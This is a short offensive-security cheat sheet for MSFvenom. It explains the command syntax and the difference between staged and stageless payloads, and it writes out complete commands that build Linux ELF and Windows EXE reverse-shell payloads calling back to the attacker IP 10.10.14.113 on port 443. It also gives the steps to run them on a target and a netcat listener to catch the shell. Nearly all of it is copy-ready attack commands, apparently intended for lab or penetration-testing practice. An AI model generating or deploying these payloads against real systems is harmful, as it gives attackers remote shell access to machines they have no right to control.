# MSFvenom
```table-of-contents
```
## MSFvenom Basics
### Command Syntax
```shell
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> > <OUTPUT_FILE>
```

| **Flag**    | **Description**                                    |
| ------- | ---------------------------------------------- |
| `-p`    | Payload (e.g., `linux/x64/shell_reverse_tcp`). |
| `-f`    | Format (e.g., `elf`, `exe`, `python`, `raw`).  |
| `LHOST` | Listening Host (Your Attacker IP).             |
| `LPORT` | Listening Port.                                |
| `-o`    | Output file (Alternative to `>`).              |
## Staged vs. Stageless
- **Staged (`shell/reverse_tcp`):** Small payload. Connects back and downloads the rest of the shell code. Needs Metasploit Handler (`exploit/multi/handler`).
- **Stageless (`shell_reverse_tcp`):** Complete payload. Larger size, but works with standard Netcat listeners. **(Recommended for simple NC shells).**
## Linux Payloads (Stageless)
### Build (ELF)
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf
```
### Execute (Target)
```shell
chmod +x shell.elf
./shell.elf
```
## Windows Payloads (Stageless)
### Build (EXE)
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe
```
### Execute (Target)
```powershell
shell.exe
```
## Listener (Netcat)
```shell
sudo nc -lvnp 443
```